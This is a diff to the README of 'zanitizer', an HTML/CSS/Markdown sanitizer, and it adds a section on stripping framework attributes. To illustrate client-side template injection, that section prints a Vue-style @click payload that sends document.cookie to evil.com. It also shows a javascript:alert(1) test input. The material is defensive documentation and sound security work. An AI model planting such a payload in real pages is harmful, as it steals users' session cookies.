@@ -3,7 +3,8 @@
 ![Zig support](https://img.shields.io/badge/Zig-0.15.2-color?logo=zig&color=%23f3ab20)
 
 
-`zanitizer` is a fast and lightweight HTML+CSS sanitizer, DOM-CSS aware, not regex-based. Built on top of `lexbor`.
+`zanitizer` is a fast self-contained HTML+CSS+Markdown sanitizer built for backend rich-text processing, available as a composable CLI or a Node.js WASM module.
+Built on top of `lexbor` for building the DOM.
 
 <p align="center">
 <img src="https://github.com/ndrean/zanitizer/blob/main/images/GGI_zanitizer.png" alt="Gemini Generated Image" width="700" height="700" />
@@ -11,13 +12,16 @@
 
 <br>
 
+It performs the sanitization in context, meaning  DOM and CSS aware, so retains the structure (_not regex-based_).
+
+It combines a fast Markdown-to-safe-HTML pipeline.
+
+It follows the `SanitizerConfig` API with presets and per-element attribute control.
+
 This tool can be used:
 
 - as a WASM module (700kB) (`Node` and browser).
 - or as a composable, embeddable CLI (1.4MB unzipped)
-
-It performs the sanitization in context, meaning  DOM and CSS aware, so retains the structure.
-It follows the `SanitizerConfig` API with presets and per-element attribute control.
 
 **Speed test**:
 
@@ -181,7 +185,7 @@ zan.init('{"strictUriValidation": true}');          // inline override
 zan.init();                                          // default preset
 ```
 
-**Field reference**:
+<details><summary>**Field reference**</summary>
 
 ```js
 {
@@ -230,6 +234,8 @@ zan.init();                                          // default preset
 }
 ```
 
+</details>
+
 **Rules and constraints**:
 
 - elements and removeElements are mutually exclusive.
@@ -272,6 +278,126 @@ zan.init(JSON.stringify({
   sanitizeDomClobbering: true,
 }));
 const clean = zan.sanitizeFragment(userHtml);
+```
+
+---
+
+## Framework Attributes
+
+**All non-standard attributes are stripped by default.** The sanitizer only passes attributes it recognises from the HTML spec. Framework attributes (`wire:model`, `data-turbo-frame`, `x-data`, `hx-get`…) are unknown to the spec and are therefore removed unless you explicitly opt in.
+
+### Why block framework attributes by default?
+
+This protects against **Client-Side Template Injection (CSTI)**.
+
+A framework attribute is inert HTML from the browser's point of view, but it is executable code from the framework's point of view. Consider a blog that lets users post comments and sanitizes them with Zanitizer before storing — and the blog happens to be built with Vue or Alpine. An attacker posts:
+
+```html
+<span @click="fetch('https://evil.com/?c='+document.cookie)">click me</span>
+```
+
+The browser renders a harmless `<span>`. The sanitizer has no way to know whether the page uses Vue. But when Vue boots, it scans the DOM, finds `@click`, compiles it, and executes the payload on the next click. The attacker has achieved script execution without a `<script>` tag.
+
+The same attack surface exists for every framework event handler: `x-on:*`, `wire:click`, `phx-click`, `v-on:*`, `(click)`, `on:*`, etc.
+
+Stripping framework attributes by default is therefore the only safe posture when sanitizing **user-generated content**. `--allow-attr-prefix` / `customAttrPrefixes` is for **developer-controlled data** — you opt in for the specific prefixes your app uses, and the sanitizer still blocks protocol injection on their values.
+
+For your own trusted templates that legitimately contain event handlers, use `"bypassSafety": true`.
+
+### `--allow-attr-prefix` (CLI, repeatable)
+
+```sh
+# Livewire
+echo '<div wire:model="name" wire:navigate>ok</div>' \
+  | zan --allow-attr-prefix wire:
+# => <div wire:model="name" wire:navigate="">ok</div>
+
+# Multiple frameworks at once
+echo '<div data-turbo-frame="main" stimulus-controller="my">ok</div>' \
+  | zan --allow-attr-prefix data-turbo --allow-attr-prefix stimulus-
+
+# Protocol injection is always blocked even on allowed prefixes
+echo '<div wire:click="javascript:alert(1)">bad</div>' \
+  | zan --allow-attr-prefix wire:
+# => <div>bad</div>   (wire:click stripped, wire:model would be kept)
+```
+
+### `customAttrPrefixes` (JSON config / WASM)
+
+```sh
+zan --config '{"customAttrPrefixes":["wire:","livewire:","data-turbo"]}' dirty.html
+```
+
+```js
+// WASM
+zan.init(JSON.stringify({ customAttrPrefixes: ['wire:', 'livewire:', 'data-turbo'] }));
+const clean = zan.sanitizeFragment(userHtml);
+```
+
+### Security model
+
+Allowed-prefix attributes go through **protocol-only** value checking. The sanitizer blocks:
+
+- `javascript:` — always dangerous
+- `vbscript:` — always dangerous
+- `data:text/html` — HTML injection via data URI
+- `data:text/javascript` — JS injection via data URI
+
+JS code-pattern scanning (`eval(`, `import(`, etc.) is **intentionally skipped** for these attributes. Framework attribute values can be URLs, CSS selectors, Alpine expressions, or Livewire component props — the sanitizer cannot distinguish them without framework-specific knowledge. Protocol injection is the unambiguous structural threat.
+
+> If you need to strip JS expressions from framework values, pre-process the data server-side before passing it to the sanitizer.
+
+---
+
+## Using Markdown input
+
+We use the library [md4c](https://github.com/mity/md4c) with `MD_DIALECT_GITHUB` — tables, strikethrough, task lists, and autolinks are all enabled.
+
+> Usage: just add the flag `--md`.
+
+An example:
+
+```sh
+echo "# Hello from Markdown
+
+This is **GFM** rendered natively via md4c.
+
+| Column A | Column B |
+|----------|----------|
+| foo      | bar      |
+| baz      | qux      |
+
+- [x] md4c parses GFM tables and task lists
+- [x] lexbor renders the resulting HTML
+- [ ] profit
+
+~~Strikethrough~~, https://example.com autolink, and <span style=\"color:red\">raw HTML</span> all work." \
+| ./zig-out/bin/zan - --md
+```
+
+gives:
+
+```html
+<html>
+  <head></head>
+  <body>
+    <h1>Hello from Markdown</h1>
+    <p>This is <strong>GFM</strong> rendered natively via md4c.</p>
+    <table>
+      <thead><tr><th>Column A</th><th>Column B</th></tr></thead>
+      <tbody>
+        <tr><td>foo</td><td>bar</td></tr>
+        <tr><td>baz</td><td>qux</td></tr>
+      </tbody>
+    </table>
+    <ul>
+      <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="" checked=""> md4c parses GFM tables and task lists</li>
+      <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="" checked=""> lexbor renders the resulting HTML</li>
+      <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled=""> profit</li>
+    </ul>
+    <p><del>Strikethrough</del>, <a href="https://example.com">https://example.com</a> autolink, and <span style="color: red">raw HTML</span> all work.</p>
+  </body>
+</html>
 ```
 
 ---
@@ -394,53 +520,3 @@ This software uses heavily [lexbor](https://lexbor.com)
 - `lexbor` [License Apache 2.0](https://github.com/lexbor/lexbor/blob/master/LICENSE)
 - `md4c` [License MIT](https://github.com/mity/md4c/blob/master/LICENSE.md)
 
-## Using Markdown input
-
-We use the library [md4c](https://github.com/mity/md4c) with `MD_DIALECT_GITHUB` — tables, strikethrough, task lists, and autolinks are all enabled.
-
-> Usage: just add the flag `--md`.
-
-An example:
-
-```sh
-echo "# Hello from Markdown
-
-This is **GFM** rendered natively via md4c.
-
-| Column A | Column B |
-|----------|----------|
-| foo      | bar      |
-| baz      | qux      |
-
-- [x] md4c parses GFM tables and task lists
-- [x] lexbor renders the resulting HTML
-- [ ] profit
-
-~~Strikethrough~~, https://example.com autolink, and <span style=\"color:red\">raw HTML</span> all work." \
-| ./zig-out/bin/zan - --md
-```
-
-gives:
-
-```html
-<html>
-  <head></head>
-  <body>
-    <h1>Hello from Markdown</h1>
-    <p>This is <strong>GFM</strong> rendered natively via md4c.</p>
-    <table>
-      <thead><tr><th>Column A</th><th>Column B</th></tr></thead>
-      <tbody>
-        <tr><td>foo</td><td>bar</td></tr>
-        <tr><td>baz</td><td>qux</td></tr>
-      </tbody>
-    </table>
-    <ul>
-      <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="" checked=""> md4c parses GFM tables and task lists</li>
-      <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="" checked=""> lexbor renders the resulting HTML</li>
-      <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled=""> profit</li>
-    </ul>
-    <p><del>Strikethrough</del>, <a href="https://example.com">https://example.com</a> autolink, and <span style="color: red">raw HTML</span> all work.</p>
-  </body>
-</html>
-```
